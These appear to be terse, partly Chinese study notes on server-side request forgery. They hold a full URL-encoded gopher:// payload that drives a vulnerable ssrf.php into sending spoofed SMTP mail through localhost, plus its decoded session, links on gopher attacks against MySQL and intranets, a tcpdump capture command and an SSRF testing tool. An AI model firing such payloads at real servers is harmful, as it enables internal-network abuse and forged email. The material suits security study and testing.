docker exec -it  8dd9944ce897 bash

https://programming.vip/docs/ssrf-uses-gopher-to-attack-mysql-and-intranet.html
https://blog.csdn.net/weixin_35678674/article/details/114470729?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-1-114470729-blog-119734740.pc_relevant_paycolumn_v3&spm=1001.2101.3001.4242.2&utm_relevant_index=3

tcpdump -i any port 3306 -w mysql.pcap

**Gopher 发送的smtp数据**

```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```

http://canarytokens.com/feedback/tags/2yvkaz8k4erksjod12yql9c7c/submit.aspx



工具：

- [SSRF Sheriff - https://github.com/teknogeek/ssrf-sheriff](https://github.com/teknogeek/ssrf-sheriff)